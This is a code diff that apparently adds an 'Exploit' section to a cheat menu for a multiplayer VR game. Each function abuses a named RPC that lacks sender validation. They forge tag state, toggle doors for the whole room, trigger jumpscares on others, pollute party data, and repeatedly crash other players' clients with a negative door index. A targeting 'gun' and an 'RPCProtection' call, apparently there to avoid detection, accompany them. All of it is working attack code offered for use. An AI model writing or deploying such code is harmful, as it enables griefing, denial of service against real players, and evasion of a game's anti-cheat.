@@ -2928,5 +2928,298 @@ namespace Qubit.Modules.Categories
             return true;
         }
         #endregion
+
+        #region Exploit: Tag State Corruption (RPC_ReportTag pre-validation SetTaggedBy)
+
+        private static float tagStateDelay;
+
+        /// <summary>
+        /// RPC_ReportTag calls taggedRig.SetTaggedBy(taggingRig) on the
+        /// master client before any tag validation (mode, distance,
+        /// cooldown) runs. Distance-fail only reports; the taggedById
+        /// write on the master's rig copy has already happened.
+        /// Works from any client; master's copy of the target rig now
+        /// believes you tagged them last.
+        /// </summary>
+        private static void SendTagState(VRRig target)
+        {
+            if (!Networking.InRoom || target == null)
+                return;
+
+            GameModeSerializer handler = GameMode.ActiveNetworkHandler;
+            if (handler == null)
+                return;
+
+            // Payload is the tagged player's actor number; info.Sender
+            // (us) becomes the tagging player in SetTaggedBy. bool
+            // overload targets others; master receives the report.
+            handler.SendRPC("RPC_ReportTag", false, target.GetPlayer().ActorNumber);
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void TagStateGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                if (!GetGunInput(true) || Time.time < tagStateDelay) return;
+                tagStateDelay = Time.time + 0.25f;
+                SendTagState(gunTarget);
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        public static void TagStateAll()
+        {
+            if (!Networking.InRoom || Time.time < tagStateDelay) return;
+            tagStateDelay = Time.time + 0.5f;
+
+            foreach (VRRig rig in Players.ActiveRigs.Where(r => !r.IsLocal()))
+                SendTagState(rig);
+        }
+
+        #endregion
+
+        #region Exploit: Ghost Lab Entrance Doors (RemoteEntranceDoorState no sender check)
+
+        private static float ghostLabDoorDelay;
+        private static bool ghostLabDoorOpenState = true;
+
+        private static GhostLabReliableState GetGhostLabState() =>
+            UnityEngine.Object.FindObjectsOfType<GhostLabReliableState>().FirstOrDefault();
+
+        /// <summary>
+        /// RemoteEntranceDoorState only gates on the receiving view's
+        /// IsMine; there is no sender validation. The owner applies the
+        /// state and re-serializes it to the whole room.
+        /// </summary>
+        public static void GhostLabDoors(bool open)
+        {
+            if (!Networking.InRoom || Time.time < ghostLabDoorDelay) return;
+
+            GhostLabReliableState state = GetGhostLabState();
+            if (state == null) return;
+
+            ghostLabDoorDelay = Time.time + 0.1f;
+            state.SendRPC("RemoteEntranceDoorState", RpcTarget.All,
+                open ? GhostLab.EntranceDoorsState.OuterDoorOpen : GhostLab.EntranceDoorsState.BothClosed);
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void GhostLabDoorsOpen() => GhostLabDoors(true);
+        public static void GhostLabDoorsClose() => GhostLabDoors(false);
+
+        public static void GhostLabDoorsSpam()
+        {
+            if (!Networking.InRoom || Time.time < ghostLabDoorDelay) return;
+
+            GhostLabReliableState state = GetGhostLabState();
+            if (state == null) return;
+
+            ghostLabDoorDelay = Time.time + 0.05f;
+            ghostLabDoorOpenState = !ghostLabDoorOpenState;
+            state.SendRPC("RemoteEntranceDoorState", RpcTarget.All,
+                ghostLabDoorOpenState ? GhostLab.EntranceDoorsState.InnerDoorOpen : GhostLab.EntranceDoorsState.OuterDoorOpen);
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        #endregion
+
+        #region Exploit: Ghost Lab Door Crash (RemoteSingleDoorState negative index)
+
+        private static float ghostLabCrashDelay;
+
+        /// <summary>
+        /// RemoteSingleDoorState checks doorIndex &lt; singleDoorCount but
+        /// never checks &gt;= 0. A negative index throws
+        /// IndexOutOfRangeException on the owning client every frame it
+        /// is processed. Spam targets every client that owns a state view.
+        /// </summary>
+        public static void GhostLabDoorCrashAll()
+        {
+            if (!Networking.InRoom || Time.time < ghostLabCrashDelay) return;
+
+            GhostLabReliableState[] states = UnityEngine.Object.FindObjectsOfType<GhostLabReliableState>();
+            if (states == null || states.Length == 0) return;
+
+            ghostLabCrashDelay = Time.time + 0.05f;
+            foreach (GhostLabReliableState state in states)
+                state.SendRPC("RemoteSingleDoorState", RpcTarget.Others, -1);
+
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void GhostLabDoorCrashGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                if (!GetGunInput(true) || Time.time < ghostLabCrashDelay) return;
+                ghostLabCrashDelay = Time.time + 0.05f;
+
+                NetPlayer targetPlayer = gunTarget.GetPlayer();
+                GhostLabReliableState[] states = UnityEngine.Object.FindObjectsOfType<GhostLabReliableState>();
+                foreach (GhostLabReliableState state in states)
+                    state.SendRPC("RemoteSingleDoorState", targetPlayer, -1);
+
+                Qubit.Core.Security.RPCProtection();
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        #endregion
+
+        #region Exploit: Whack-a-Mole (WhackAMoleButtonPressed no permission check)
+
+        private static float whackAMoleDelay;
+
+        /// <summary>
+        /// WhackAMoleButtonPressed is RpcTarget.All with no sender
+        /// permission check in the handler beyond a spam guard. Any
+        /// client can start the game for the entire room.
+        /// </summary>
+        public static void WhackAMoleAll()
+        {
+            if (!Networking.InRoom || Time.time < whackAMoleDelay) return;
+
+            WhackAMole[] moles = UnityEngine.Object.FindObjectsOfType<WhackAMole>();
+            if (moles == null || moles.Length == 0) return;
+
+            whackAMoleDelay = Time.time + 0.25f;
+            foreach (WhackAMole mole in moles)
+                mole.GetView.RPC("WhackAMoleButtonPressed", RpcTarget.All);
+
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void WhackAMoleGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                if (!GetGunInput(true) || Time.time < whackAMoleDelay) return;
+                whackAMoleDelay = Time.time + 0.25f;
+
+                NetPlayer targetPlayer = gunTarget.GetPlayer();
+                WhackAMole[] moles = UnityEngine.Object.FindObjectsOfType<WhackAMole>();
+                foreach (WhackAMole mole in moles)
+                    mole.GetView.RPC("WhackAMoleButtonPressed", targetPlayer.GetPlayerRef());
+
+                Qubit.Core.Security.RPCProtection();
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        #endregion
+
+        #region Exploit: Cauldron Ingredients (OnIngredientAdd sender-rig-only check)
+
+        private static float cauldronDelay;
+
+        /// <summary>
+        /// OnIngredientAdd only verifies the sender has a rig in cache;
+        /// every receiver plays the ingredient FX for the index. Fire
+        /// arbitrary ingredient adds on everyone's cauldron.
+        /// </summary>
+        public static void CauldronAll()
+        {
+            if (!Networking.InRoom || Time.time < cauldronDelay) return;
+
+            MagicCauldron[] cauldrons = UnityEngine.Object.FindObjectsOfType<MagicCauldron>();
+            if (cauldrons == null || cauldrons.Length == 0) return;
+
+            cauldronDelay = Time.time + 0.1f;
+            int index = UnityEngine.Random.Range(0, 8);
+            foreach (MagicCauldron cauldron in cauldrons)
+                cauldron.SendRPC("OnIngredientAdd", RpcTarget.All, index);
+
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void CauldronGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                if (!GetGunInput(true) || Time.time < cauldronDelay) return;
+                cauldronDelay = Time.time + 0.1f;
+
+                NetPlayer targetPlayer = gunTarget.GetPlayer();
+                MagicCauldron[] cauldrons = UnityEngine.Object.FindObjectsOfType<MagicCauldron>();
+                foreach (MagicCauldron cauldron in cauldrons)
+                    cauldron.SendRPC("OnIngredientAdd", targetPlayer, UnityEngine.Random.Range(0, 8));
+
+                Qubit.Core.Security.RPCProtection();
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        #endregion
+
+        #region Exploit: Skeleton Jumpscare (RemoteActivateGhost IsMine-only gate)
+
+        private static float skeletonScareDelay;
+
+        /// <summary>
+        /// RemoteActivateGhost runs on the view owner with zero sender
+        /// validation. Triggers the second-look ghost scare sequence on
+        /// every owner in the room.
+        /// </summary>
+        public static void SkeletonScareAll()
+        {
+            if (!Networking.InRoom || Time.time < skeletonScareDelay) return;
+
+            SecondLookSkeletonSynchValues[] skeletons = UnityEngine.Object.FindObjectsOfType<SecondLookSkeletonSynchValues>();
+            if (skeletons == null || skeletons.Length == 0) return;
+
+            skeletonScareDelay = Time.time + 0.5f;
+            foreach (SecondLookSkeletonSynchValues skeleton in skeletons)
+            {
+                skeleton.SendRPC("RemoteActivateGhost", RpcTarget.Others);
+                skeleton.SendRPC("RemotePlayerSeen", RpcTarget.Others);
+            }
+
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        public static void SkeletonScareGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                if (!GetGunInput(true) || Time.time < skeletonScareDelay) return;
+                skeletonScareDelay = Time.time + 0.5f;
+
+                NetPlayer targetPlayer = gunTarget.GetPlayer();
+                SecondLookSkeletonSynchValues[] skeletons = UnityEngine.Object.FindObjectsOfType<SecondLookSkeletonSynchValues>();
+                foreach (SecondLookSkeletonSynchValues skeleton in skeletons)
+                {
+                    skeleton.SendRPC("RemoteActivateGhost", targetPlayer);
+                    skeleton.SendRPC("RemotePlayerSeen", targetPlayer);
+                }
+
+                Qubit.Core.Security.RPCProtection();
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        #endregion
+
+        #region Exploit: Party Merge Pollution (NotifyPartyMerging any-sender int[] write)
+
+        private static float partyMergeDelay;
+
+        /// <summary>
+        /// NotifyPartyMerging lets any sender write an int[10] of actor
+        /// numbers into partyMergeIDs on every receiver, keyed by the
+        /// sender's actor number. Junk data degrades party grouping.
+        /// </summary>
+        public static void PartyMergeAll()
+        {
+            if (!Networking.InRoom || Time.time < partyMergeDelay) return;
+
+            FriendshipGroupDetection detector = UnityEngine.Object.FindObjectsOfType<FriendshipGroupDetection>().FirstOrDefault();
+            if (detector == null) return;
+
+            partyMergeDelay = Time.time + 0.25f;
+            int[] junk = Enumerable.Range(1, 10).ToArray();
+            foreach (Player player in PhotonNetwork.PlayerList.Where(p => !p.IsLocal))
+                detector.photonView.RPC("NotifyPartyMerging", player, junk);
+
+            Qubit.Core.Security.RPCProtection();
+        }
+
+        #endregion
     }
 }
+
